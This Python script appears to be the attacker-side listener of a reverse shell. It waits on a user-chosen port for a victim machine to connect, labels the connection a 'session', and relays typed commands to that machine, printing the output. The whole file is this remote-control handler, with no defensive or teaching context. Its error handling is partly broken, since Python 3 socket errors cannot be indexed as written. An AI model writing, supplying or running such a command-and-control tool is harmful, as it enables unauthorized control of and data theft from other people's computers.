import socket, os, sys
os.system("cls")

def socketCreate():
    try:
        global host 
        global port 
        global s
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ""
        
        port = input("Type the port for listening: ")
        
        if port == "":
            socketCreate()
            
        port = int(port)

    except socket.error as msg:
         print("Socket creation error: " + str(msg[0]))
         
def socketBind():
    try:

        print('Binding socket at port %s' %(port))

        s.bind((host,port))
        print(host)
        s.listen(1)
        
    except socket.error as msg:
        print ("Socket binding error: " + str(msg[0]))
        print ("Retrying...")
        socketBind()


def socketAccept(): 
    global conn
    global addr
    global hostname
    
    try:
        conn, addr = s.accept()
        print("[!] Session opened at %s:%s" % (addr[0],addr[1]))
        print("\n")

        hostname = dataRecv(conn, 4096)
        menu()
          
    except socket.error as msg:
        print("Socket Accepting error:" + str(msg[0]))

        
def menu():
    while 1:
        cmd = input(str(addr[0]) + "@" + str(hostname) + "> ")
      
        if cmd == "quit":
            conn.close ()
            s.close ( )
            sys.exit()
              
        command = dataSend(conn, cmd) 
        result = dataRecv(conn, 16834)
          
        if (result != hostname):
            print(result)

def main():
    socketCreate() 
    socketBind()
    socketAccept()

def dataSend(con, data):
    print("[*] Sending data [" + data + "]")
    return con.sendall(data.encode('utf-8'))

def dataRecv(con, size):
    data = con.recv(size).decode('utf-8')
    #print("[!] Recieved data [" + data + "]")
    return data

main()
